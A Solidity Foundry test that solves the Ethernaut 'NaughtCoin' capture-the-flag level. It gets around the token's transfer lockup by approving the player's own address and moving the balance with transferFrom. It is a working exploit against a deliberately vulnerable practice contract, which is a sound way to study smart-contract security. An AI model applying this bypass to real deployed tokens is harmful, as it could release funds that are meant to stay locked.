// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/NaughtCoin.sol";
import "../src/NaughtCoinFactory.sol";

contract NaughtCoinTest is Test {
    Ethernaut ethernaut;
    NaughtCoinFactory level;
    NaughtCoin instance;
    address player = address(312);
    address guest = address(555);
    address instanceAddress;

    function setUp() public {
        ethernaut = new Ethernaut();
        level = new NaughtCoinFactory();
        ethernaut.registerLevel(level);
        startHoax(player);
        instanceAddress = ethernaut.createLevelInstance(level);
        instance = NaughtCoin(instanceAddress);
    }

    function testNaughtCoinHack() public {
        console.log("balance: ", instance.balanceOf(player));
        instance.approve(player, instance.balanceOf(player));
        // instance.approve(guest, type(uint256).max);
        // vm.deal(guest, 10 ether);
        // vm.startPrank(guest);

        instance.transferFrom(player ,guest, instance.balanceOf(player));
        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(instanceAddress)
        );
        assert(levelCompleted);
    }
}
